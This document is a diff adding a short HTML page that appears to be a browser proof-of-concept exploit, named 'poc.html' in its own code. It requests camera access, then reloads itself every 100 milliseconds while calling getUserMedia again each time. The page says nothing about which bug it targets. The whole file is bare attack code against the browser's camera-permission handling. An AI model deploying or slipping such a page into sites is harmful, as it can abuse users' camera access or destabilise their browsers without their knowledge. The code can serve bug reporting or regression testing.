@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+    <button id="triggerButton">Trigger</button>
+    <script>
+        triggerButton = document.querySelector('#triggerButton');
+        triggerButton.addEventListener('click', async event => {
+                navigator.mediaDevices.getUserMedia({video: true}).then(res=>{
+                    location.href = "poc.html?reload";
+                }).catch(error =>{
+                    alert("Please accept the permission request.")
+                });
+        });
+        window.onload = ()=>{
+            if (location.search == "?reload"){
+                document.writeln("Wait for a while.")
+                navigator.mediaDevices.getUserMedia({video: true}).then(res=>{
+                    setTimeout(()=>{
+                        location.reload()
+                    },100);
+                });
+            }
+        }
+    </script>
+</body>
+</html>
